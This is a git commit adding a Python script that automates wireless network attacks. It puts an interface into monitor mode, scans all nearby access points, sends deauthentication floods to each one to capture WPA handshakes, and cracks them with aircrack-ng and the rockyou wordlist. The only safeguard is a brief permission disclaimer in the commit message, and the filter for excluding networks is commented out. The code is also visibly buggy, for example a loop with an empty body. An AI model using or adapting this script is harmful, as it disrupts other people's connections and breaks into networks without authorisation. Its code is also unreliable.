fa9465d542035d29e297a2e466a713e995c74d73
pSecurIT <65850183+pSecurIT@users.noreply.github.com>
2020-06-10 18:14:45 +0000

    First commit
    This version will contain bugs, unoptimized code and inconsistencies. Please use this script only if you are in a controlled environment and have permission of the owner of the surrounding networks.

---
+++ aircrack-automated.py
@@ -0,0 +1,190 @@
+import os, sys, subprocess, time, csv
+def start_airmon(a):
+	subprocess.call(["x-terminal-emulator", "-e", "airmon-ng"])
+	subprocess.call(["x-terminal-emulator", "-e", "airmon-ng check kill"])
+	subprocess.call(["x-terminal-emulator", "-e", "airmon-ng start " + a])
+	return a + "mon"
+
+def mon_networks(b,c):
+	filename = "output_airmon"
+	proc = subprocess.Popen(["x-terminal-emulator", "-e", "airodump-ng " + c + " -w " + filename + " --output-format csv"])
+	wait_timeout(proc, b)
+	return filename + "-01.csv"
+
+def parse(filename):
+	with open(filename, 'rb') as f:
+		z = f.read()
+	#SPLIT INTO 2 PARTS (STATIONS AND CLIENTS)
+	parts = z.split('\r\n\r\n')
+	stations = parts[0]
+	#WE WON'T DO ANYTHING WITH THE CLIENTS, BUT IF YOU'RE INTERESTED YOU CAN FIND THEM IN:
+	#clients = parts[1]
+
+	if sys.version_info[0] < 3:
+		from StringIO import StringIO
+	else:
+		from io import StringIO
+
+	stations_str = StringIO(stations)
+
+	r = csv.reader(stations_str)
+	i = list(r)
+	z = [k for k in i if k <> []]
+	
+	stations_list = z
+
+	return stations_list
+def extract(stations_list):
+
+	#DATA FROM STATIONS (ACCESS POINTS)
+	nstations = len(stations_list)
+	sthead = stations_list[0]
+	stations_head = [j.strip() for j in sthead]
+	stations_data = [stations_list[i] for i in range(1, nstations)]
+
+	ap_mac = []
+	ap_name = []
+	ap_sec = []
+	ap_pow = []
+	ap_ch = []	
+
+	for i, row in enumerate(stations_data):
+	
+		#get indices
+		ap_mac_ix = stations_head.index('BSSID')
+		ap_name_ix = stations_head.index('ESSID')
+		ap_sec_ix = stations_head.index('Privacy')
+		ap_pow_ix = stations_head.index('Power')
+		ap_ch_ix = stations_head.index('channel')
+
+		#get values
+		ap_mac.append(row[ap_mac_ix].strip())
+		ap_name.append(row[ap_name_ix].strip())
+		ap_sec.append(row[ap_sec_ix].strip())
+		ap_pow.append(row[ap_pow_ix].strip())
+		ap_ch.append(row[ap_ch_ix].strip())
+	
+		print(ap_name[i] + ": " + ap_pow[i])
+		
+		#other stuff
+		mac_prefix = ap_mac[0:8]
+		#ap_mfg = lookup_hardware(mac_prefix)
+	for i, row in enumerate(ap_name):
+		#IF THERE ARE NETWORKS YOU DO NOT WANT TO CRACK OR DEAUTH USERS FROM
+		#if ap_name[i] == "" or ap_name[i] == "":
+		#	del ap_mac[i]
+		#	del ap_name[i]
+		#	del ap_ch[i]
+	
+	return ap_mac, ap_name, ap_ch
+
+def mon_networks_for_handshake(mon, ap_mac, ap_name, ap_ch):
+
+	filename_list = [] 
+	
+	for i, row in enumerate(ap_mac):
+		try:
+		
+			name = "handshake_" + ap_name[i]
+			name = name.replace(" ", "")
+			command = "airodump-ng --bssid " + ap_mac[i] + " -c " + ap_ch[i] + " -w " + name + " " + mon
+			proc_mon = subprocess.Popen(["x-terminal-emulator", "-e", command])
+			
+			#WAIT 2 SEC
+			time.sleep(2)
+
+			proc_deauth = subprocess.Popen(["x-terminal-emulator", "-e", "aireplay-ng --deauth 25 -a " + ap_mac[i] + " " + mon])
+		
+			print("----------------------UNDER DEAUTH--------------------")		
+			time.sleep(10)
+			proc_mon.kill()
+			proc_deauth.kill()
+		except:
+			print("An exception occured while capturing the hadshake.")
+		
+		filename = ""
+
+		try:
+			while True:
+				count = 1	
+				filename = name + "-0" + str(count)
+				if os.path.isfile(filename + ".csv"):		
+				
+					filename_list.append(filename					)
+
+					#DELETE ALL FILES EXCEPT .CAP
+					cleanup(filename + ".csv")
+					cleanup(filename + ".kismet.csv")
+					cleanup(filename + ".kismet.netxml")
+					cleanup(filename + ".log.csv")
+				
+					count = count + 1
+					break
+		except:
+			print("An exception occured while deleting the files.")
+	
+	return ap_name, ap_mac, filename_list
+
+def crack(ap_mac, filename_list):
+
+	for i, row in enumerate(ap_mac):
+		print("STARTING TO CRACK: " + ap_mac[i] + " and filename: " + filename_list[i])
+		time.sleep(5)
+		#Clean the capture file
+		#wpaclean newfile.cap capfile.cap
+		command = "aircrack-ng -b " + ap_mac[i] + " -w rockyou.txt " + filename_list[i] + ".cap -l pass_" + filename_list[i] + ".txt"
+		proc_crack = subprocess.Popen(["x-terminal-emulator", "-e", command])
+
+
+def wait_timeout(proc, timeout):	
+	start = time.time()
+	end = start + timeout
+	interval = min(timeout/1000.0, .25)
+
+	while True:
+		result = proc.poll()
+		if result is not None:
+			return result
+		if time.time() >= end:
+			proc.kill()
+		time.sleep(interval)
+
+def cleanup(c):
+	os.remove(c)
+
+#PUT HERE YOUR NETWORK INTERFACE
+a = "wlan1"
+
+#TIMEOUT TIME
+b = 30
+
+#START AIRMON-NG AND KILL ALL BLOCKING PROCESSES
+c = start_airmon(a)
+
+#CAPTURE NETWORK TRAFIC AROUND YOU
+d = mon_networks(b,c)
+
+#PARSE DATA FROM NETWORK TRAFIC
+e = parse(d)
+
+#EXTRACTING THE NEEDED DATA FROM THE LISTS
+g, h, i = extract(e)
+
+#DEAUTH AND CAPTURE HANDSHAKE
+j, k, l = mon_networks_for_handshake(c,g,h,i)
+
+captured_handshakes_string = "";
+for index, row in enumerate(j):
+	captured_handshakes_string += j[index] + ", "
+
+print("---------------------------------------------------------")
+print("Handshakes captured from: " + captured_handshakes_string)
+
+#CRACK THE HANDSHAKES
+crack(k,l)
+	
+#DELETE GENERATED FILES
+cleanup(d)
+
+
+
